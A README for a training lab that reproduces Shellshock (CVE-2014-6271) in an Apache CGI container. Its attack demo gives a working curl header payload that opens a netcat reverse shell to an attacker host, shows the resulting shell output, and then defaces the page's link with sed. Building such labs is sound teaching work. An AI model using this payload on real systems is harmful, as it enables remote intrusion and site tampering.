# CVE-2014-6271-Apache-Debian

## Overview
This Repo is PoC environment of [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/cve-2014-6271).  
You can deploy web site including vulernability using apache2 container image.  

## Preparation
### Image Build
Build insecure image from Dockerfile.

~~~
# docker build -t cve-2014-6271-apache-debian:buster ./insecure-base-image/
# docker build -t training-website-poc:v1.0 ./web-insecure/
~~~

### Deploy PoC Container
**Docker**

Deploy PoC container as docker container.  

~~~
# docker run -d -p 8080:80 training-website-poc:v1.0
~~~

**Kubernetes**

Deploy PoC container as k8s pod and service.

~~~
# kubectl apply -f web-insecure/k8s-manifest/web-insecure-pod.yml
# kubectl apply -f web-insecure/k8s-manifest/web-insecure-svc.yml
~~~

### Access PoC Web Service

After the deployment is completed, you can browse the web page by accessing the following URL with a browser.  
You can access the k8s lab environment by clicking the link "Click!" under the web page.  

**Docker**
~~~
http://<docker host IP>:8080
~~~

**Kubernetes**
~~~
http://<k8s service endpoint>:<k8s service port>
~~~


### Attack Demo
In this demo, you can change the web page from Attacker Host (outside of container) exploiting vulernability of `CVE-2014-6271`.  

Exec these commands from attacker host. 


Terminal 1
~~~
# nc -nvlp 5050
~~~

Terminal 2  
※In this case, we deploy PoC container using Docker. In case of Kubernetes, the URL should be `http://<k8s service endpoint>:<k8s service port>`.
~~~
# curl -H "user-agent: () { :; }; echo; /bin/nc -e /bin/bash <Attacker Host IP> 5050" http://<Container Host IP>:8080/cgi-bin/vulnerable
~~~

After that, you can see that the `/bin/bash` of the PoC container can be executed in the terminal 1.  

~~~
Listening on 0.0.0.0 5050
Connection received on 172.17.0.2 38926
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(wheel)
pwd
/usr/lib/cgi-bin
~~~

Change the link "Click!" of web page.  
In this case, we use dummy page for malicious link.  

~~~
sudo sed -i -e 's/https\:\/\/www.katacoda.com\/courses\/kubernetes/danger.html/' /var/www/html/index.html
~~~

Access the web page again and clicking the link "Click!" under the web page.  

~~~
http://<Container Host IP>:8080
~~~



## Reference
https://github.com/hmlio/vaas-cve-2014-6271  
https://github.com/opsxcq/exploit-CVE-2014-6271  

